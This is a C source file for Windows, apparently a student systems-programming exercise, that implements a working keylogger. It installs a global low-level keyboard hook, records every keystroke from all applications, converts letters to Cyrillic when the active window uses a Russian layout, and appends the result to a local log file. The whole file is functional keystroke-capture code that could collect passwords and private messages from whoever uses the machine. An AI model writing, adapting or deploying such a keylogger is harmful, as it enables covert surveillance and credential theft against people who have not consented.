#include <Windows.h>
#include <stdio.h>
#define PATH L"X:\\4 курс\\сист программ\\hook\\KeyLog.txt"
#define RUS 1049
#define ENG 1033
#define SIZE_STR 20

BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(LPWSTR wstr);
WCHAR EnToRus(WCHAR c);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
	MSG msg = { 0 };
	while(GetMessageW(&msg, NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hHook);
	return 0;
}
BOOL IsCaps(void)
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^ (GetKeyState(VK_SHIFT) & 0x8000) != 0) return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5))
		{
			iKey |= 0x1 << 24;
		}
		LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		GetKeyNameTextW(iKey, KeyString, SIZE_STR);
		if (wcslen(KeyString) > 1)
		{
			WriteToFile(L"[");
			WriteToFile(KeyString);
			WriteToFile(L"]");
		}
		else
		{
			if (!IsCaps()) KeyString[0] = tolower(KeyString[0]);
			if (KeyLayout == ENG)
			{
				
			}
			if (KeyLayout == RUS)
			{
				KeyString[0] = EnToRus(KeyString[0]);
			}
			WriteToFile(KeyString);
		}
		free(KeyString);
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

WCHAR EnToRus(WCHAR c)
{
	switch (c)
	{
	case L'q':
		return L'й';
	case L'w':
		return L'ц';
	case L'e':
		return L'у';
	case L'r':
		return L'к';
	case L't':
		return L'е';
	case L'y':
		return L'н';
	case L'u':
		return L'г';
	case L'i':
		return L'ш';
	case L'o':
		return L'щ';
	case L'p':
		return L'з';
	case L'[':
		return L'х';
	case L']':
		return L'ъ';
	case L'a':
		return L'ф';
	case L's':
		return L'ы';
	case L'd':
		return L'в';
	case L'f':
		return L'а';
	case L'g':
		return L'п';
	case L'h':
		return L'р';
	case L'j':
		return L'о';
	case L'k':
		return L'л';
	case L'l':
		return L'д';
	case L';':
		return L'ж';
	case L'z':
		return L'я';
	case L'x':
		return L'ч';
	case L'c':
		return L'с';
	case L'v':
		return L'м';
	case L'b':
		return L'и';
	case L'n':
		return L'т';
	case L'm':
		return L'ь';
	case L',':
		return L'б';
	case L'.':
		return L'ю';
	case L'/':
		return L'.';
	default:
		return L' ';
	}
}
